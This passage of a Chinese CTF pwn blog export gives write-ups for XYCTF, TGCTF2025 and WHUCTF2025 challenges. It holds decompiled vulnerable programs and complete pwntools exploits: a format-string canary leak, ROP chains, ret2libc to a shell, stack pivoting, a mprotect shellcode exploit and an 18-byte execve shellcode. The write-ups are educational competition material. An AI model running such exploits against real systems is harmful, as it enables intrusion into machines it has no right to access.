goto 0014</span><br><span class="line"> 0007: 0x15 0x06 0x00 0x00000142  <span class="keyword">if</span> (A == execveat) goto 0014</span><br><span class="line"> 0008: 0x15 0x00 0x04 0x00000000  <span class="keyword">if</span> (A != <span class="built_in">read</span>) goto 0013</span><br><span class="line"> 0009: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 <span class="comment"># read(fd, buf, count)</span></span><br><span class="line"> 0010: 0x15 0x00 0x03 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0014</span><br><span class="line"> 0011: 0x20 0x00 0x00 0x00000010  A = fd <span class="comment"># read(fd, buf, count)</span></span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p><strong>open函数可以用openat代替</strong>，于是进行orw<br>程序开启了canary保护和PIE保护，选项三有格式化字符串漏洞，可以利用来泄露canary，libc地址和程序基地址<br>选项1的溢出长度并不足以进行orw，于是我们把rop链用选项三写入，然后利用选项一栈迁移过去即可<br>需要注意的是，迁移过去的前56字节不要写rop链，不然会执行失败（还不知道为啥）<br>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20331</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./xyctf_girlfriend&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">talk</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;what do you want to say to her?&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">myname</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;You should tell her your name first\n&#x27;</span>,myname)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your name:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;%15$p%17$p%7$p&#x27;</span></span><br><span class="line">payload1=payload1.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">name(payload1)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak_add=<span class="built_in">int</span>(r.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">elfbase=<span class="built_in">int</span>(r.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x18d9</span></span><br><span class="line">libcbase=leak_add+<span class="number">48</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">pop_rdi=libcbase+<span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi=libcbase+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12=libcbase+<span class="number">0x11f2e7</span></span><br><span class="line">pop_rax=libcbase+<span class="number">0x45eb0</span></span><br><span class="line">leave_ret=libcbase+<span class="number">0x4da83</span></span><br><span class="line">open_add=libcbase+libc.sym[<span class="string">&#x27;openat&#x27;</span>]</span><br><span class="line">read_add=libcbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_add=libcbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_add=libcbase+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">name_add=elfbase+<span class="number">0x4060</span></span><br><span class="line">ropchain=<span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(close_add)+p64(pop_rdi)+p8(<span class="number">156</span>)+p8(<span class="number">255</span>)*<span class="number">7</span>+p64(pop_rsi)+p64(name_add)+p64(pop_rdx_r12)</span><br><span class="line">ropchain+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(open_add)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_add)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">ropchain+=p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(write_add)</span><br><span class="line">ropchain=ropchain.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">name(ropchain)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(canary)+p64(name_add+<span class="number">48</span>)+p64(leave_ret)</span><br><span class="line">talk(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ret2libc </category>
          
          <category> stack pivoting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TGCTF2025</title>
      <link href="/2025/05/02/TGCTF2025/"/>
      <url>/2025/05/02/TGCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>简单的ret2libc,源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;As a student who has been learning pwn for half a year\n&quot;</span></span><br><span class="line">    <span class="string">&quot;basic ROP is an essential skill that everyone should master. \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Therefore, hurry up and complete the check-in. \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Welcome to the Hangzhou Normal University CTF competition, please leave your name.&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无需多言，直接放exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">31903</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./tgctf_sign&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./tgctf_sign&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401176</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">main=<span class="number">0x401178</span></span><br><span class="line">puts_plt=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(main)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name.&#x27;</span>,payload1)</span><br><span class="line">puts_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=puts_add-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_add)+p64(sys_add)+p64(main)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><h3 id="ROP-静态链接-shellcode"><a href="#ROP-静态链接-shellcode" class="headerlink" title="ROP&#x2F;静态链接&#x2F;shellcode"></a>ROP&#x2F;静态链接&#x2F;shellcode</h3><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">200</span>]; <span class="comment">// [esp+0h] [ebp-D0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+C8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;could you tell me your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">256</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;i heard you love gets,right?&quot;</span>);</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ida分析时发现这是一道32位静态链接的题目，不考虑ret2libc。<br>题目开启了canary和NX，又是静态题目，我们考虑写入shellcode并执行mprotect函数提升权限<br>看调用gets函数的汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call    gets</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">lea     esp, [ebp-8]</span><br><span class="line">pop     ecx</span><br><span class="line">pop     ebx</span><br><span class="line">pop     ebp</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote()</span></span><br><span class="line">r=process(<span class="string">&#x27;./tgctf_overflow&#x27;</span>)</span><br><span class="line">mprotect_add=<span class="number">0x8070A70</span></span><br><span class="line">puts_add=<span class="number">0x80527D0</span></span><br><span class="line">name_pro=<span class="number">0x80EF000</span></span><br><span class="line">name=<span class="number">0x80ef320</span></span><br><span class="line">canary=name+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">shellcode=p32(mprotect_add)+p32(name+<span class="number">20</span>)+p32(name_pro)+p32(<span class="number">0x1000</span>)+p32(<span class="number">7</span>)+asm(shellcraft.sh())</span><br><span class="line">payload1=shellcode.rjust(<span class="number">256</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">len</span>(shellcode))</span><br><span class="line">r.sendafter(<span class="string">b&#x27;could you tell me your name?&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc8</span>+p32(name+<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;i heard you love gets,right?&#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h3><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello hacker&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;try to show your strength &quot;</span>);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x12u</span>LL);</span><br><span class="line">  mprotect(buf, <span class="number">0x1000u</span>LL, <span class="number">4</span>);</span><br><span class="line">  sub_11C9((__int64)buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_11c9函数的源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_11C9</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rdi &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以输入0x12字节的shellcode，最后直接执行，gdb调试得知执行时我们输入的shellcode时候寄存器全部清零，除了rip指向{jmp rdi}和rdi指向我们输入的shellcode<br>于是我们写短的shellcode即可，但0x12已经比常规最短shellcode还要短了<br>最短shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 31 f6             xor rsi, rsi</span><br><span class="line">56                 push rsi</span><br><span class="line">58 bf 2f 62 69 6e 2f mov rdi,0x68732f2f6e69622f;</span><br><span class="line">2f 73 68</span><br><span class="line">57                   push rdi</span><br><span class="line">54                   push rsp</span><br><span class="line">5f                   pop rdi     ;stack pointer to /bin//sh</span><br><span class="line">b0 3b                mov al, 59 ;sys_execve 66 b8 3b 00 mov ax,59</span><br><span class="line">99                   cdq     ;sign extend of eax</span><br><span class="line">0f 05                syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于只有0x12字节，使用栈来传入&#x2F;bin&#x2F;sh是行不通的。此题便可以使用寄存器的信息。由于有rdi指向我们输入的shellcode，可以利用这一点直接写&#x2F;bin&#x2F;sh，然后add rdi即可实现&#x2F;bin&#x2F;sh的传入<br>最后令eax为execve的系统调用号，再syscall就可getshell<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./tgctf_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote()</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov eax,0x3b</span></span><br><span class="line"><span class="string">        add rdi,0x8</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">shellcode+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;strength &#x27;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>笔者的ida反汇编不出这题的源码（悲，硬着头皮看汇编做不太现实，遂放弃</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> shellcode </category>
          
          <category> ret2libc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WHUCTF2025</title>
      <link href="/2025/05/02/WHUCTF2025/"/>
      <url>/2025/05/02/WHUCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="repeater-handout"><a href="#repeater-handout" class="headerlink" title="repeater_handout"></a>repeater_handout</h2><h3 id="复盘-ret2libc"><a href="#复盘-ret2libc" class="headerlink" title="复盘&#x2F;ret2libc"></a>复盘&#x2F;ret2libc</h3><p>题目源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;When Siesta was chatting with Rin-chan, he was so engrossed that he couldn&#x27;t hear what Mio and Rinpo were saying. He&quot;</span></span><br><span class="line">    <span class="string">&quot; just repeated their words to brush them off&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;choose your option: \n1. input\n2. repeat\n3. exit&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先放exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;125.220.147.47&#x27;</span>,<span class="number">49739</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./repeater_handout&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./repeater_handout&#x27;</span>)</span><br><span class="line">pop_rdi_offset=<span class="number">0x02a3e5</span></span><br><span class="line">ret_offset=<span class="number">0x029139</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload0=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">r.send(payload0)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">25</span>)</span><br><span class="line">canary=u64(r.recv()[<span class="number">25</span>:<span class="number">32</span>].rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">16</span></span><br><span class="line">r.send(payload1)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">40</span>)</span><br><span class="line">ret_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">__libc_start_main_add=ret_add+<span class="number">48</span></span><br><span class="line">libcbase=__libc_start_main_add-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span 